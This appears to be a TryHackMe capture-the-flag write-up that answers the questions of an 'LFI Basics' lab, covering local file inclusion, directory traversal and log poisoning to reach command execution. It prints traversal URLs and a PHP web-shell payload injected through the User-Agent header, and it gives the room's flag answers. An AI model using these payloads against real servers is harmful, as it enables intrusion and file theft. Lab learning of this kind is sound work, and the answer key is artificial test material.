# LFI Basics

Learn the basics of local file inclusion


## [Task 1] Local File Inclusion

### #4 What's the message you get when you include the home.html?
```
You included home.html
```

### #6 What user that it's not by default there is present?
```
lfi
```

## [Task 2] Local File Inclusion using Directory Traversal

### #2 Add the "?page=" parameter, and try to include the home page again. Does it work (Yes/No)?
```
no
```

### #3 What are the credit card numbers?
```
http://<IP>/lfi2/lfi.php?page=../creditcard

1111-2222-3333-4444
```

## [Task 3] Reaching RCE using LFI and log poisoning

### #4 Can you read the log (Yes/No)?
```
Yes
```

### #6 Give it a try and run uname -r. What's the output of the command?
```
http://<IP>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname -r

Note: I used Burp Suite and interceptted it. Modified the User-Agent section to add PHP code injection <?php system($_GET['lfi']) ?>

4.15.0-72-generic
```

### #7 With this knowledge read the flag from the lfi user home directory.
```
http://<IP>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat /home/lfi/flag.txt

THM{a352a5c2acfd22251c3a94105b718fea}
```




